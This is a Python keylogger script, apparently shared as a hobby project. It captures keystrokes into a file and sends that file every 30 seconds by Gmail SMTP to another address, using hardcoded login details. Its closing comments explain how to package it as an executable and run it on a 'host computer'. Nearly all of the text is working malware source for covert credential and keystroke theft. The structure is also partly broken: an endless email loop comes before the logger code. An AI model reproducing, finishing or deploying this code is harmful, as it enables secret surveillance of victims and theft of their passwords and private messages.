#library

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from datetime import datetime

from pynput.keyboard import Key, Listener

import time
import random
import datetime
from time import sleep
import datetime
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process
from PIL import ImageGrab

keys_information = "keylog.txt"                     #file where the data will be stored
email_address= "example@gmail.com"                  #email which will send the keyloggs
password = "kwcvasdasdamvdzw"

toaddr = "example2@gmail.com"                       #mail that will receive the keyloggs

file_path = "D:\\"                                  #path where the data will be stored
extend = "\\"

count = 0
keys = []

#from above till this point are important

#send email function

while(True):                                        #sends mail every given seconds

        def send_email(filename, attachment, toaddr):

            fromaddr = email_address

            msg = MIMEMultipart()

            msg['From'] = fromaddr

            msg['To'] = toaddr

            msg['Subject'] = "Log file"

            body = "Body_of_the_mail"

            msg.attach(MIMEText(body, 'plain'))

            filename = filename
            attachment = open(attachment, 'rb')

            p = MIMEBase('application', ' octet-stream')

            p.set_payload((attachment).read())

            encoders.encode_base64(p)

            p.add_header('Content-Disposition',"attachment; filename= %s" % filename)

            msg.attach(p)

            s = smtplib.SMTP('smtp.gmail.com', 587)

            s.starttls()

            s.login(fromaddr, password)

            text = msg.as_string()

            s.sendmail(fromaddr, toaddr, text)

            s.quit()

        send_email(keys_information, file_path + extend + keys_information, toaddr)

        time.sleep(30)                          #the given seconds inside() can be changed


# keylogg function


def keyboard():                                 #script that will record the information that was typed by user in above mentioned file and directory
    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


#point1-this project is not fully completed, and to make this project work in case to understand just a simple logic and working. Split the email function and keylogg function by creating 2 different py project file and save them seperately (NOTE: the location, filename, sender and receiver email must be same, even the libraries must be copied)
#point2-only a few imports have been utilised except the ones mentioned above, the other non utilised ones can be considered as future enhancement and can be created. If anyone interested in updating this go ahead and use this as reference.
#point3-as mentioned in point1 incase if you want a keylogg project, with the help of auto-py-to-exe convert the two different script into a exe file and open it in host computer.